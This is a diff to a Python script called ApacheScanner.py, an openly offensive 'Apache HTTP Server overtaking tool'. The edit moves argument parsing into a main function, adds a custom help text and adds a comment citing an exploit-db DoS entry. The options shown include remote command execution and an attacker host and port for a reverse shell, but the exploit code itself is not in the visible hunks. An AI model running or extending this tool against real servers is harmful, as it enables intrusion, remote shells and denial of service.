@@ -2,30 +2,59 @@ import argparse
 import requests
 import struct
 import socket
+import sys
 
 def header():
     print('''
-
  ▗▄▖▗▄▄▖ ▗▄▖ ▗▄▄▗▖ ▗▗▄▄▄▖     ▗▄▄▖▗▄▄▖▗▄▖▗▖  ▗▗▖  ▗▗▄▄▄▗▄▄▖ 
 ▐▌ ▐▐▌ ▐▐▌ ▐▐▌  ▐▌ ▐▐▌       ▐▌  ▐▌  ▐▌ ▐▐▛▚▖▐▐▛▚▖▐▐▌  ▐▌ ▐▌
 ▐▛▀▜▐▛▀▘▐▛▀▜▐▌  ▐▛▀▜▐▛▀▀▘     ▝▀▚▐▌  ▐▛▀▜▐▌ ▝▜▐▌ ▝▜▐▛▀▀▐▛▀▚▖
 ▐▌ ▐▐▌  ▐▌ ▐▝▚▄▄▐▌ ▐▐▙▄▄▖    ▗▄▄▞▝▚▄▄▐▌ ▐▐▌  ▐▐▌  ▐▐▙▄▄▐▌ ▐▌
-                                     https://github.com/Yqno                       
-                                                            ''')  
+                        https://github.com/Yqno                                    
+                                                            ''')
 
-# Command-line argument parser
-parser = argparse.ArgumentParser(description='Apache HTTP Server overtaking tool written by Yqno')
+def print_custom_help():
+    print('''\
+Usage: ApacheScanner.py [options]
 
-parser.add_argument('-u', '--url', type=str, help='The target URL of your Apache HTTP Server (default is localhost)', default='http://localhost:8080')
-parser.add_argument('-t', '--timeout', type=int, help='The timeout of the request in seconds (default is 25)', default=25)
-parser.add_argument('-p', '--port', type=int, help='The port number of your Apache HTTP Server (default port is 8080)', default=8080)
-parser.add_argument('-c', '--command', type=str, help='The command to be executed on your Apache HTTP Server (default is ls -l)', default='ls -l')
-parser.add_argument('--rce', action='store_true', help='Enable remote code execution on your Apache HTTP Server', default=False, required=False)
-parser.add_argument('--cmd', type=str, help='Command to run if RCE is enabled', default="whoami")
-parser.add_argument('--lhost', type=str, help='Attacker IP for reverse shell', required=True)
-parser.add_argument('--lport', type=int, help='Attacker listening port for reverse shell', required=True)
+Apache HTTP Server scanning and overtaking tool written by Yqno.
 
-args = parser.parse_args()
+Options:
+  -h, --help            Show this help message and exit
+  -u URL, --url URL     The target URL of your Apache HTTP Server (default is http://localhost:8080)
+  -t TIMEOUT, --timeout TIMEOUT
+                        The timeout of the request in seconds (default is 25)
+  -p PORT, --port PORT  The port number of your Apache HTTP Server (default port is 80)
+  -c COMMAND, --command COMMAND
+                        The command to be executed on your Apache HTTP Server (default is ls -l)
+  --rce                 Enable remote code execution on your Apache HTTP Server (default is False)
+  --cmd CMD             Command to run if RCE is enabled (default is whoami)
+  --lhost LHOST         Attacker IP for reverse shell (required if --rce is enabled)
+  --lport LPORT         Attacker listening port for reverse shell (required if --rce is enabled)
+''')
+
+def main():
+    parser = argparse.ArgumentParser(description='Apache HTTP Server overtaking tool written by Yqno.')
+
+    parser.add_argument('-u', '--url', type=str, help='The target URL of your Apache HTTP Server (default is localhost)', default='http://localhost:8080')
+    parser.add_argument('-t', '--timeout', type=int, help='The timeout of the request in seconds (default is 25)', default=25)
+    parser.add_argument('-p', '--port', type=int, help='The port number of your Apache HTTP Server (default port is 80)', default=80)
+    parser.add_argument('-c', '--command', type=str, help='The command to be executed on your Apache HTTP Server (default is ls -l)', default='ls -l')
+    parser.add_argument('--rce', action='store_true', help='Enable remote code execution on your Apache HTTP Server (default is False)', default=False)
+    parser.add_argument('--cmd', type=str, help='Command to run if RCE is enabled (default is whoami)', default="whoami")
+    parser.add_argument('--lhost', type=str, help='Attacker IP for reverse shell (required if --rce is enabled)', required=True)
+    parser.add_argument('--lport', type=int, help='Attacker listening port for reverse shell (required if --rce is enabled)', required=True)
+
+    args = parser.parse_args()
+
+    # Check if the user requested help
+    if '--help' in sys.argv or '-h' in sys.argv:
+        print_custom_help()
+        sys.exit()
+
+    # Proceed with the rest of the script
+    exploiter = Exploiter(args.url, args.timeout, args.port, args.command, args.rce, args.cmd, args.lhost, args.lport)
+    exploiter.run_checks()
 
 class Exploiter:
     def __init__(self, url, timeout, port, command, rce, cmd, lhost, lport):
@@ -94,6 +123,7 @@ class Exploiter:
             print(f"[!] Error: {e}")
 
     # DoS Attack Check
+    # Source: https://www.exploit-db.com/exploits/40909
     def check_dosattack(self):
         print(f"[*] Checking for DoS vulnerability on {self.url}")
         try:
@@ -137,6 +167,5 @@ class Exploiter:
         self.check_dosattack()
         self.execute_rce()
 
-# Instantiate and run the exploiter with the provided arguments
-exploiter = Exploiter(args.url, args.timeout, args.port, args.command, args.rce, args.cmd, args.lhost, args.lport)
-exploiter.run_checks()
+if __name__ == "__main__":
+    main()
